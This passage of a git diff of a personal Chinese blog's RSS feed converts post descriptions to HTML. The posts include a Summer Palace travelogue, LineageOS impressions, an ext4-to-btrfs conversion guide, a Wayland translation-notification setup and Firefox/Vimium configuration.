-颐和园 选择颐和园, 是因为离信工所比较近. 当日原本想带yq去我平时去的早餐店, 可惜我们出发之时, 已是中午十二点了, 于是带她吃之前推荐过的意大利沙县萨莉亚. 这是一个价格非常亲民的意大利西餐厅, 看了看菜单上十几二十元的菜品后, 我们彻底放下了对价格的顾虑, 仅仅考虑口味和胃口. 实际上这家店的口味确实不错, 特别是蘑菇浓汤, 虽然肯定不能说顶级, 但这种不用顾虑价格就享受西餐的轻松感, 独此一份 (说白了还是太穷).
-阳光正好, 晒在身上暖洋洋的. 我们在下公交之后, 慢慢悠悠前往颐和园的入口, 路上落叶飞舞, 却无半点萧条, 行人来来往往, 一个婴儿车里的小孩指着另一个在妈妈自行车车筐里的小孩羡慕地哇哇直叫, 惹得两边的家长忍俊不禁. 走走停停之间, 我们时而在路边的亭子里歇脚, 时而在红砖绿瓦的不知名府门前驻足拍照, 心下一片闲适.
-进入颐和园后才发现这里出乎意料的大, 但想想这毕竟是皇帝的游玩之地, 倒也算合理. 我们绕过威武的麒麟像, 路过皇帝慈禧临时听政的仁寿宫和一棵棵百年龙柏, 穿过城关, 来到谐趣园. 因为是秋天的缘故, 尽管气温并不让人觉得有秋意, 但是池中的荷花已经尽数枯萎, 风光不再, 宛如那个死去多时的王朝. 沿着回廊行走, 我恼于这行走的空间竟然如此狭窄, 古代的皇帝不与人并肩行走, 其他的人只能尾随, 因此凡是走廊一类的地方都可以设计地窄小一些, 只是我不禁开始无端思考, 长期地处于这样的空间里, 人的心胸眼界是否也会变得狭小呢?
-一路上看到了许多格格打扮的女生在凹造型拍照, 纸扇轻摇, 回眸一笑, 气质优雅, 恬静端庄, 只是都没有我的身边人这般可爱.
-来到苏州街, 我和yq沿河而行, 小心路过一间间无人的商铺.</description>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;与所爱之人在一起的时光, 会生出互相的珍惜, 这份珍惜犹如风筝线一般, 即便对方远在云端, 依旧可以感知到其心念所动, 于是思念由此而生.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在yq成功上岸家乡的教师编后, 为了庆祝, 也为了缓解许久未见的相思之苦, 我匆忙计划了一下行程, 一边让她订来北京的车票,  一边思考附近哪里有卖香槟的.&lt;/p&gt;
+&lt;h2 id=&#34;颐和园&#34;&gt;颐和园&lt;/h2&gt;
+&lt;p&gt;选择颐和园, 是因为离信工所比较近. 当日原本想带yq去我平时去的早餐店, 可惜我们出发之时, 已是中午十二点了, 于是带她吃之前推荐过的意大利沙县萨莉亚. 这是一个价格非常亲民的意大利西餐厅, 看了看菜单上十几二十元的菜品后, 我们彻底放下了对价格的顾虑, 仅仅考虑口味和胃口. 实际上这家店的口味确实不错, 特别是蘑菇浓汤, 虽然肯定不能说顶级, 但这种不用顾虑价格就享受西餐的轻松感, 独此一份 (说白了还是太穷).&lt;/p&gt;
+&lt;p&gt;阳光正好, 晒在身上暖洋洋的. 我们在下公交之后, 慢慢悠悠前往颐和园的入口, 路上落叶飞舞, 却无半点萧条, 行人来来往往, 一个婴儿车里的小孩指着另一个在妈妈自行车车筐里的小孩羡慕地哇哇直叫, 惹得两边的家长忍俊不禁. 走走停停之间, 我们时而在路边的亭子里歇脚, 时而在红砖绿瓦的不知名府门前驻足拍照, 心下一片闲适.&lt;/p&gt;
+&lt;p&gt;进入颐和园后才发现这里出乎意料的大, 但想想这毕竟是皇帝的游玩之地, 倒也算合理. 我们绕过威武的麒麟像, 路过皇帝慈禧临时听政的仁寿宫和一棵棵百年龙柏, 穿过城关, 来到谐趣园. 因为是秋天的缘故, 尽管气温并不让人觉得有秋意, 但是池中的荷花已经尽数枯萎, 风光不再, 宛如那个死去多时的王朝. 沿着回廊行走, 我恼于这行走的空间竟然如此狭窄, 古代的皇帝不与人并肩行走, 其他的人只能尾随, 因此凡是走廊一类的地方都可以设计地窄小一些, 只是我不禁开始无端思考, 长期地处于这样的空间里, 人的心胸眼界是否也会变得狭小呢?&lt;/p&gt;
+&lt;p&gt;一路上看到了许多格格打扮的女生在凹造型拍照, 纸扇轻摇, 回眸一笑, 气质优雅, 恬静端庄, 只是都没有我的身边人这般可爱.&lt;/p&gt;
+&lt;p&gt;来到苏州街, 我和yq沿河而行, 小心路过一间间无人的商铺. 昔日皇帝为在此重现江南风情, 仿照水镇在此地建造了买卖街, 专供宫中人游览, 即所谓&amp;quot;宫市&amp;quot;. 这个地方1860被列强烧毁, 一百多年后才由共和国重建, 然而我对此类皇室娱乐并不感冒, 只是紧张地一遍遍提醒不停拍照的yq小心别把手机丢进河里.&lt;/p&gt;</description>
     </item>
     <item>
       <title>lineageos使用体验</title>
       <link>https://ch3n9w.github.io/posts/tech-lineageos-md/</link>
       <pubDate>Sun, 13 Aug 2023 21:34:53 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/tech-lineageos-md/</guid>
-      <description>2024年7月更新: 经过了半年的时候, 遇到的问题包括但不限于 1) 微信卡顿 2) 银行类app无法使用 3) system UI经常崩溃 4) 快充消失. 出于可用性考虑, 已经转回coloros
-2024年2月更新: Lsposed连同一系列root隐藏模块已经归档无法使用, 为了方便日常使用, 建议卸载magisk, 刷机的时代已经过去了.
-不知道从什么时候开始, 往日被冠以高可玩性高自由度的安卓系统逐渐变得封闭, 一步步沦为资本市场的玩物和工具. MIUI也好, ColorOS也罢, 用户总能在使用系统的过程中发现一些去也去不掉的应用和小程序, 看到一些不想看也得看的广告, 而起初, 有些人尽管对此有所不满, 但基本都选择容忍的态度, 但这几年国内的趋势越来越不对劲: 先是某APP在全社会的宣传下或软性或硬性地被安装在了相当大一部分人的手机中监控个人信息(当然, 我理解打击诈骗行为, 保护平民百姓的钱包远比软件自由重要得多), 又是拼多多被爆出利用安卓手机的0day漏洞在所有用户的手机上进行多种恶意行为, 一直到最近, 一则某信部的发文通知将这种 我的手机不归我管 的焦虑感推向了新的高潮.
-就目前来看, 这则通知的社会反响并不强烈, 不出意外应该可以顺利推行. 之后最直观的效果就是所有使用国内安卓系统的用户都只能安装指定的app, 不再具备安装推特等软件的能力, 这无异于干掉了安卓最大的特点, 使其沦落为全方位落后于苹果的手机系统. 作为一个经历过安卓app爆发式增长年代的玩家, 我很好奇现在新接触到手机的用户对自己掌中的设备是一个什么样的印象, 是一个拥有无限可能的工具? 还是一个用低质量内容, 广告和充满限制的操作系统来无限吸收注意力, 获取个人隐私并变相管理个人精神世界的资本和政府工具?
-万幸的是, 安卓的开源属性为它保留下了一些自由的火种, 那边是第三方rom. 本文主要记录自己安装 lineageos, magisk, Lsposed 以及一些有用软件的过程.
-购买机器 查看lineageos支持的设备列表, 出于对一加的偏好和对骁龙888发热的不放心, 我选择以一加8pro作为自己的新设备. 在咸鱼上逛了很久, 筛掉一大批机器贩子和低质量卖家后, 我看中了一位宝妈的二手机并下单. 机器到手后我非常满意, 因为成色实在是很好, 连维修店里给我手机换电池的工程师也赞叹保养得不错, 这1700虽然有点贵, 但还是值得的.</description>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;2024年7月更新: 经过了半年的时候, 遇到的问题包括但不限于 1) 微信卡顿 2) 银行类app无法使用 3) system UI经常崩溃 4) 快充消失. 出于可用性考虑, 已经转回coloros&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;2024年2月更新: Lsposed连同一系列root隐藏模块已经归档无法使用, 为了方便日常使用, 建议卸载magisk, 刷机的时代已经过去了.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;p&gt;不知道从什么时候开始, 往日被冠以高可玩性高自由度的安卓系统逐渐变得封闭, 一步步沦为资本市场的玩物和工具. MIUI也好, ColorOS也罢, 用户总能在使用系统的过程中发现一些去也去不掉的应用和小程序, 看到一些不想看也得看的广告, 而起初, 有些人尽管对此有所不满, 但基本都选择容忍的态度, 但这几年国内的趋势越来越不对劲: 先是某APP在全社会的宣传下或软性或硬性地被安装在了相当大一部分人的手机中监控个人信息(当然, 我理解打击诈骗行为, 保护平民百姓的钱包远比软件自由重要得多), 又是拼多多被爆出利用安卓手机的0day漏洞在所有用户的手机上进行多种恶意行为, 一直到最近, 一则某信部的发文通知将这种 &lt;code&gt;我的手机不归我管&lt;/code&gt; 的焦虑感推向了新的高潮.&lt;/p&gt;
+&lt;p&gt;就目前来看, 这则通知的社会反响并不强烈, 不出意外应该可以顺利推行. 之后最直观的效果就是&lt;strong&gt;所有使用国内安卓系统的用户都只能安装指定的app, 不再具备安装推特等软件的能力&lt;/strong&gt;, 这无异于干掉了安卓最大的特点, 使其沦落为全方位落后于苹果的手机系统. 作为一个经历过安卓app爆发式增长年代的玩家, 我很好奇现在新接触到手机的用户对自己掌中的设备是一个什么样的印象, 是一个拥有无限可能的工具? 还是一个用低质量内容, 广告和充满限制的操作系统来无限吸收注意力, 获取个人隐私并变相管理个人精神世界的资本和政府工具?&lt;/p&gt;
+&lt;p&gt;万幸的是, 安卓的开源属性为它保留下了一些自由的火种, 那边是第三方rom. 本文主要记录自己安装 lineageos, magisk, Lsposed 以及一些有用软件的过程.&lt;/p&gt;
+&lt;h2 id=&#34;购买机器&#34;&gt;购买机器&lt;/h2&gt;
+&lt;p&gt;查看&lt;a href=&#34;https://wiki.lineageos.org/devices/&#34;&gt;lineageos支持的设备列表&lt;/a&gt;, 出于对一加的偏好和对骁龙888发热的不放心, 我选择以一加8pro作为自己的新设备. 在咸鱼上逛了很久, 筛掉一大批机器贩子和低质量卖家后, 我看中了一位宝妈的二手机并下单. 机器到手后我非常满意, 因为成色实在是很好, 连维修店里给我手机换电池的工程师也赞叹保养得不错, 这1700虽然有点贵, 但还是值得的.&lt;/p&gt;</description>
     </item>
     <item>
       <title>动荡时代</title>
@@ -168,44 +230,108 @@ clash for windows是基于开源的clash core核心代码做的图形化客户�
       <link>https://ch3n9w.github.io/posts/tech-ext4-to-btrfs/</link>
       <pubDate>Mon, 16 Jan 2023 05:28:51 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/tech-ext4-to-btrfs/</guid>
-      <description>这篇文章是对我从ext4文件系统转换到btrfs过程中的一些操作记录, 便于日后参考.
-前置准备 制作arch linux 启动盘, 版本越新越好. 备份重要文件 我个人在转换前会把大文件(例如虚拟机文件)转移到移动硬盘里, 让转换过程更快一些 转换 进入LiveCD 系统, 对主分区进行转换
-btrfs-convert /dev/nvme0n1p2 等待一段时间之后, 显示conversion complete就表示没有问题, 接下来还需要做三件事情才可以进入系统
-修改fstab 首先将转换成功后的分区挂载到/mnt下
-mount /dev/nvme0n1p2 /mnt 使用lsblk -f命令查看分区的UUID号, 拍个照片记一下
-编辑/mnt/etc/fstab, 修改这个分区类型为btrfs, 将最后的两列数字都改成0, 保存退出
-重建内存盘 先挂载, 然后进入chroot环境
-mount -t proc none /mnt/proc mount -t sysfs none /mnt/sys mount -o bind /dev /mnt/dev chroot /mnt bash 然后执行下列命令来为所有内核重建内存盘
-mkinitcpio -P 最后重建grub引导, 按照道理应该要把引导分区/dev/nvme0n1p1挂载到/mnt/boot之后才可以, 但是我记得自己执行的时候没有挂载?
-grub-mkconfig -o /boot/grub/grub.cfg 重建grub引导 在上一步的chroot环境中, 执行下列命令, 记得把引导分区挂载到/mnt/boot
-grub-mkconfig -o /boot/grub/grub.cfg 大功告成, 退出chroot, 重启电脑就可以进入你的系统了, 唯一的不同是它已经是btrfs了.</description>
+      <description>&lt;p&gt;这篇文章是对我从ext4文件系统转换到btrfs过程中的一些操作记录, 便于日后参考.&lt;/p&gt;
+&lt;h2 id=&#34;前置准备&#34;&gt;前置准备&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;制作arch linux 启动盘, 版本越新越好.&lt;/li&gt;
+&lt;li&gt;备份重要文件&lt;/li&gt;
+&lt;li&gt;我个人在转换前会把大文件(例如虚拟机文件)转移到移动硬盘里, 让转换过程更快一些&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;转换&#34;&gt;转换&lt;/h2&gt;
+&lt;p&gt;进入LiveCD 系统, 对主分区进行转换&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;btrfs-convert /dev/nvme0n1p2
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;等待一段时间之后, 显示&lt;code&gt;conversion complete&lt;/code&gt;就表示没有问题, 接下来还需要做三件事情才可以进入系统&lt;/p&gt;
+&lt;h3 id=&#34;修改fstab&#34;&gt;修改fstab&lt;/h3&gt;
+&lt;p&gt;首先将转换成功后的分区挂载到&lt;code&gt;/mnt&lt;/code&gt;下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount /dev/nvme0n1p2 /mnt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用&lt;code&gt;lsblk -f&lt;/code&gt;命令查看分区的UUID号, 拍个照片记一下&lt;/p&gt;
+&lt;p&gt;编辑&lt;code&gt;/mnt/etc/fstab&lt;/code&gt;, 修改这个分区类型为btrfs, 将最后的两列数字都改成0, 保存退出&lt;/p&gt;
+&lt;h3 id=&#34;重建内存盘&#34;&gt;重建内存盘&lt;/h3&gt;
+&lt;p&gt;先挂载, 然后进入chroot环境&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount -t proc none /mnt/proc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount -t sysfs none /mnt/sys
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mount -o bind /dev /mnt/dev
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chroot /mnt bash
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后执行下列命令来为所有内核重建内存盘&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkinitcpio -P
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后重建grub引导, 按照道理应该要把引导分区&lt;code&gt;/dev/nvme0n1p1&lt;/code&gt;挂载到&lt;code&gt;/mnt/boot&lt;/code&gt;之后才可以, 但是我记得自己执行的时候没有挂载?&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;grub-mkconfig -o /boot/grub/grub.cfg
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;重建grub引导&#34;&gt;重建grub引导&lt;/h3&gt;
+&lt;p&gt;在上一步的chroot环境中, 执行下列命令, 记得把引导分区挂载到&lt;code&gt;/mnt/boot&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;grub-mkconfig -o /boot/grub/grub.cfg
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;大功告成, 退出chroot, 重启电脑就可以进入你的系统了, 唯一的不同是它已经是btrfs了.&lt;/p&gt;</description>
     </item>
     <item>
       <title>wayland下的划词翻译解决方案</title>
       <link>https://ch3n9w.github.io/posts/tech-translation-under-wayland/</link>
       <pubDate>Wed, 11 Jan 2023 04:36:45 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/tech-translation-under-wayland/</guid>
-      <description>对于我这种英语不好的人来说, 翻译是离不开的工具, 但是众所周知, Linux的日用软件生态相比较windows和macos来说相差甚远, 别说目前正处于发展阶段的wayland, 就连成熟透了的x11下也没有拿得出手的翻译软件. 作为一个英语不好的Linux爱好者, 缺少翻译软件必定会对日常的使用造成一定的影响, 于是开始思考怎么样解决这个问题.
-我的第一个思路, 也就是见到最多的划词翻译软件的样子, 选中文本之后, 在被选中的文本周围的某块区域中绘制一个窗口, 在其中展示翻译结果. 但是问题来了, 要如何绘制这样的窗口呢? 在wayland中, 窗口的位置交给了compositor进行管理, 这种能够自己决定显示位置的能力, 据我所知, 在wayland下仅有fcitx5做到了, 于是我翻阅了一下它的源代码, 并没有看懂, 但是应该没有借助于Qt和GTK来绘制, 而是使用wayland-client. 对我这样一个连Qt GTK开发经历都没有的人来说, 理解wayland编程开发中的那些概念实在有些困难. 于是紧接着又有一个问题出现了:
-能否绕开wayland?
-就我思考这个问题的时候, linux QQ给我发了一个系统通知, 我的电脑上的系统通知服务原先只是为了让linux qq不崩溃才安装的, 然而这个时候, 它给了我一个新的解决方案: 使用系统通知来呈现翻译结果. 于是搜了一下如何发送系统通知, 发现竟然意外的简单.
-notify-send &amp;#34;title&amp;#34; &amp;#34;content&amp;#34; 那么接下来的问题: 如何获取选中文本的内容? 这个问题, 我原本计划通过阅读wl-clipboard来学习的, 但是我想先尽快用上翻译, 把优化放到以后再说, 于是决定直接使用wl-clipboard来获取选中文本内容, 那么至此思路理清, 大致如下:
-使用剪切板获取到选中文本的内容, 可以使用wl-paste -p来获取 获取文本之后, 将换行符替换成空格 (这块可以有更好的处理方法, 简单起见就全换掉了), 使用sed 文本处理完毕后, 将文本输入进translate.js中进行翻译, (这块可以使用别的现成工具) 翻译结果出来之后, 将结果以系统通知的形式呈现出来, 当然, 系统通知必须要有, 可以是dunst, mako, swaync, 以及kde或者gnome的桌面消息通知都可以.</description>
+      <description>&lt;p&gt;对于我这种英语不好的人来说, 翻译是离不开的工具, 但是众所周知, Linux的日用软件生态相比较windows和macos来说相差甚远, 别说目前正处于发展阶段的wayland, 就连成熟透了的x11下也没有拿得出手的翻译软件. 作为一个英语不好的Linux爱好者, 缺少翻译软件必定会对日常的使用造成一定的影响, 于是开始思考怎么样解决这个问题.&lt;/p&gt;
+&lt;p&gt;我的第一个思路, 也就是见到最多的划词翻译软件的样子, 选中文本之后, 在被选中的文本周围的某块区域中绘制一个窗口, 在其中展示翻译结果. 但是问题来了, 要如何绘制这样的窗口呢? 在wayland中, 窗口的位置交给了compositor进行管理, 这种能够自己决定显示位置的能力, 据我所知, 在wayland下仅有fcitx5做到了, 于是我翻阅了一下它的源代码, 并没有看懂, 但是应该没有借助于Qt和GTK来绘制, 而是使用wayland-client. 对我这样一个连Qt GTK开发经历都没有的人来说, 理解wayland编程开发中的那些概念实在有些困难. 于是紧接着又有一个问题出现了:&lt;/p&gt;
+&lt;p&gt;能否绕开wayland?&lt;/p&gt;
+&lt;p&gt;就我思考这个问题的时候, linux QQ给我发了一个系统通知, 我的电脑上的系统通知服务原先只是为了让linux qq不崩溃才安装的, 然而这个时候, 它给了我一个新的解决方案: 使用系统通知来呈现翻译结果. 于是搜了一下如何发送系统通知, 发现竟然意外的简单.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;notify-send &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;content&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;那么接下来的问题: 如何获取选中文本的内容? 这个问题, 我原本计划通过阅读&lt;code&gt;wl-clipboard&lt;/code&gt;来学习的, 但是我想先尽快用上翻译, 把优化放到以后再说, 于是决定直接使用&lt;code&gt;wl-clipboard&lt;/code&gt;来获取选中文本内容, 那么至此思路理清, 大致如下:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;使用剪切板获取到选中文本的内容, 可以使用&lt;code&gt;wl-paste -p&lt;/code&gt;来获取&lt;/li&gt;
+&lt;li&gt;获取文本之后, 将换行符替换成空格 (这块可以有更好的处理方法, 简单起见就全换掉了), 使用&lt;code&gt;sed&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;文本处理完毕后, 将文本输入进&lt;code&gt;translate.js&lt;/code&gt;中进行翻译, (这块可以使用别的现成工具)&lt;/li&gt;
+&lt;li&gt;翻译结果出来之后, 将结果以系统通知的形式呈现出来, 当然, 系统通知必须要有, 可以是&lt;code&gt;dunst&lt;/code&gt;, &lt;code&gt;mako&lt;/code&gt;, &lt;code&gt;swaync&lt;/code&gt;, 以及kde或者gnome的桌面消息通知都可以. 发送翻译结果使用命令&lt;code&gt;notify-send &amp;quot;标题&amp;quot; &amp;quot;翻译内容&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;以我的划词翻译为案例,  我在&lt;code&gt;~/.config/sway/config&lt;/code&gt;中加入了这么一行作为划词翻译触发按键&lt;/p&gt;</description>
     </item>
     <item>
       <title>武装火狐</title>
       <link>https://ch3n9w.github.io/posts/tech-arm-firefox/</link>
       <pubDate>Mon, 09 Jan 2023 23:04:29 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/tech-arm-firefox/</guid>
-      <description>不管火狐的市场份额多么拉胯, 对于Linux wayland用户来说, 目前体验最好的浏览器依旧是Firefox. 本篇记录我的FIrefox配置, 包括浏览器设置和插件设置.
-外观 titlebar 为了让标题栏中的内容可以更加紧凑, 一个好办法是进入about:config, 设置browser.compactmode.show为true, 然后进入custom toolbar, 设置Density为Compact
-对于wm用户, 一个推荐的设置是勾选上上图中的Title Bar选项, 为什么要这么设置呢, 因为这样子做, 那些按钮(最大最小化, 关闭窗口)就会出现到title bar中, 然后title bar会被wm吃掉, 这样就可以给火狐的标题栏留出更多的空间
-ps: 我用的主题名字叫做tokyonight
-Firefox-UI-Fix 使用Firefox-UI-Fix来个性化Firefox的界面
-Addon Vimium 该插件将vim的操作方式带入到浏览器中, 能够让用户更少依赖鼠标.
-默认情况下, firefox出于安全考虑会在一些页面中禁用Addon, 为了让该插件能够在更多的页面上使用, 需要在about:config中进行以下设置
-extensions.webextensions.restrictedDomains清空掉 privacy.resistFingerprinting.block_mozAddonManager设置为true,来让插件在所有页面上都可以使用 以下是我的Vimium键位设置.
-# Insert your preferred key mappings here. unmapAll map H previousTab map J previousTab map L nextTab map K nextTab map &amp;lt;c-j&amp;gt; scrollPageDown map &amp;lt;c-k&amp;gt; scrollPageUp map &amp;lt;c-o&amp;gt; goBack map &amp;lt;c-i&amp;gt; goForward map o Vomnibar.</description>
+      <description>&lt;p&gt;不管火狐的市场份额多么拉胯, 对于Linux wayland用户来说, 目前体验最好的浏览器依旧是Firefox. 本篇记录我的FIrefox配置, 包括浏览器设置和插件设置.&lt;/p&gt;
+&lt;h2 id=&#34;外观&#34;&gt;外观&lt;/h2&gt;
+&lt;h3 id=&#34;titlebar&#34;&gt;titlebar&lt;/h3&gt;
+&lt;p&gt;为了让标题栏中的内容可以更加紧凑, 一个好办法是进入&lt;code&gt;about:config&lt;/code&gt;, 设置&lt;code&gt;browser.compactmode.show&lt;/code&gt;为true, 然后进入custom toolbar, 设置&lt;code&gt;Density&lt;/code&gt;为&lt;code&gt;Compact&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20230109231814714.png&#34; alt=&#34;image-20230109231814714&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;对于wm用户, 一个推荐的设置是勾选上上图中的&lt;code&gt;Title Bar&lt;/code&gt;选项, 为什么要这么设置呢, 因为这样子做, 那些按钮(最大最小化, 关闭窗口)就会出现到title bar中, 然后title bar会被wm吃掉, 这样就可以给火狐的标题栏留出更多的空间&lt;/p&gt;
+&lt;p&gt;ps: 我用的主题名字叫做tokyonight&lt;/p&gt;
+&lt;h3 id=&#34;firefox-ui-fix&#34;&gt;Firefox-UI-Fix&lt;/h3&gt;
+&lt;p&gt;使用&lt;a href=&#34;https://github.com/black7375/Firefox-UI-Fix&#34;&gt;Firefox-UI-Fix&lt;/a&gt;来个性化Firefox的界面&lt;/p&gt;
+&lt;h2 id=&#34;addon&#34;&gt;Addon&lt;/h2&gt;
+&lt;h3 id=&#34;vimium&#34;&gt;Vimium&lt;/h3&gt;
+&lt;p&gt;该插件将vim的操作方式带入到浏览器中, 能够让用户更少依赖鼠标.&lt;/p&gt;
+&lt;p&gt;默认情况下, firefox出于安全考虑会在一些页面中禁用Addon, 为了让该插件能够在更多的页面上使用, 需要在&lt;code&gt;about:config&lt;/code&gt;中进行以下设置&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;code&gt;extensions.webextensions.restrictedDomains&lt;/code&gt;清空掉&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;privacy.resistFingerprinting.block_mozAddonManager&lt;/code&gt;设置为true,来让插件在所有页面上都可以使用&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;以下是我的Vimium键位设置.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Insert your preferred key mappings here.
+unmapAll
+map H previousTab
+map J previousTab
+map L nextTab
+map K nextTab
+map &amp;lt;c-j&amp;gt; scrollPageDown
+map &amp;lt;c-k&amp;gt; scrollPageUp
+map &amp;lt;c-o&amp;gt; goBack
+map &amp;lt;c-i&amp;gt; goForward
+map o Vomnibar.activateInNewTab
+map b Vomnibar.activateBookmarksInNewTab
+map t Vomnibar.activateTabSelection
+map M LinkHints.activateModeToOpenInNewTab
+map m LinkHints.activateModeToOpenInNewForegroundTab
+map gi focusInput
+map gg scrollToTop
+map G scrollToBottom
+map j scrollDown
+map k scrollUp
+map h scrollLeft
+map l scrollRight
+map x removeTab
+map X restoreTab
+map ? showHelp
+map yy copyCurrentUrl
+map p openCopiedUrlInNewTab
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tip: 如果在某次更新之后发现插件不可用了, 那么可以考虑临时切换到另一个类似的插件 Vimium C , 把相同的键位复制进去就行啦.&lt;/p&gt;</description>
     </item>
     <item>
       <title>2022年度总结</title>
@@ -230,24 +356,101 @@ extensions.webextensions.restrictedDomains清空掉 privacy.resistFingerprinting
       <link>https://ch3n9w.github.io/posts/tech-arch-sway/</link>
       <pubDate>Sat, 17 Dec 2022 14:24:23 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/tech-arch-sway/</guid>
-      <description>不知不觉使用sway已经整整一年了，于是来谈一谈自己这一年的使用感受，顺便回顾了一下过去。
-起因 2019年，在一次编程作业的时候，同专业的另一个老哥向我展示了vim的代码h补全，我立刻被这种简陋但是扩展性极强的代码编辑器吸引了，于是当时还是个刚转入计算机专业的小白就开始哼哧哼哧地学习vim的配置和插件的安装。当然，这些都发生在我的Kali Linux虚拟机中。
-那个时候我正接触CTF，很多时候都要开着虚拟机，于是有一天动起了把电脑系统直接装成linux的想法。因为自己的第一台笔记本是暗夜精灵2，游戏本装Linux，第一个要考虑的就是兼容性和稳定性，在权衡各个发行版的优势和流行程度后，我选择了ubuntu18.04。笔记本重装完毕后除了风扇转个不停竟然一切运行正常，这让我实在有些惊喜，而风扇问题是英伟达独显导致的，在ubuntu上，只需要一条sudo ubuntu-drivers autoinstall就完美解决了。当时的自己很开心，仿佛打开了一道新世界的大门。
-后来，我去吉林参加了第一次线下赛，ubuntu没有掉链子，帮我拿了一个一血，我很满意。直到一次上课，手贱执行了apt upgrade，升级完电脑竟然无法开机了，一整个无语，而当时临近期末，我已经没有时间再去折腾系统了，于是紧急安装了windows应付期末复习，顺便下单了一台对Linux更加友好的笔记本Thinkpad T480。
